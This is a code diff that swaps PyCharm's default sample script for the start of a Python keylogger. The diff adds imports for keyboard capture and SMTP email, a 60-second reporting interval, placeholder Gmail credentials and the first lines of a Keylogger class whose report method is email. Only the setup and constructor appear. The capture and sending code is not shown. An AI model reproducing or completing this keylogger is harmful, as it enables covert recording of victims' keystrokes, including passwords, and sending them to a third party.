@@ -1,16 +1,19 @@
-# This is a sample Python script.
-
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
-
-
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+import keyboard
+import smtplib # for sending email using SMTP protocol (gmail)
+from threading import Timer
+from datetime import datetime
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 
 
-# Press the green button in the gutter to run the script.
-if __name__ == '__main__':
-    print_hi('PyCharm')
+SEND_REPORT_EVERY = 60 # in seconds
+EMAIL_ADDRESS = "email@provider.tld"
+EMAIL_PASSWORD = "password_here"
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+class Keylogger:
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
